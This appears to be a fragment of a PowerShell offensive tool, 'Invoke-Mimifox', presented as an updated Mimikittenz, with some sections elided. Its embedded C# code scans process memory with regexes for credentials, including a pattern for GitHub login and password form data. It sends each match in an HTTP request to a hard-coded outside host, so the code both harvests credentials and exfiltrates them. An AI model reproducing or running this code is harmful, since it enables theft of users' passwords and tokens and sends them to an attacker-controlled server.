function Invoke-Mimifox
{
<#
More up to date and 2020 friendly version of Mimikittenz
#>


$asciiart = @"

"@
$Source2 = @"
using System;
            ...
            foreach (string procName in procNames)
            {
                try
                {
                    ...
                    foreach (Process pr in procs)
                    {
                        ...
                        WebRequest request = WebRequest.Create("http://192.168.10.151"+"/?"+pr);
                                    ...
                                    if (matches3.Count > 0)
                                    {
                                        for (int i = 0; i < matches3.Count; i++)
                                            if (matches3[i].Success && IsMatchesContain(lstMatch, matches3[i].Value) == false && IsRegexRecordsContain(matches3[i].Value) == false)
                                            {
                                                ...
                                                Console.WriteLine("[*]: "+matches3[i].Value);
                                                WebRequest request = WebRequest.Create("http://192.168.10.151"+"/?"+matches3[i].Value);
                                                WebResponse response = request.GetResponse();
                                                Console.ResetColor();
                                                lstMatch.Add(m);
                                            }
...
[mimikittenz.MemProcInspector]::AddRegex("GitHub","commit=Sign\+in&utf8=.([A-Za-z0-9$&+,:;=?@#|'<>.^*() %!\-]+)&authenticity_token=.([A-Za-z0-9$&+,:;=?@#|'<>.^*() %!\-]+)&ga_id=.([A-Za-z0-9$&+,:;=?@#|'<>.^*() %!\-]+)&login=.([A-Za-z0-9$&+,:;=?@#|'<>.^*() %!\-]+)&password=.([A-Za-z0-9$&+,:;=?@#|'<>.^*() %!\-]+)&web")
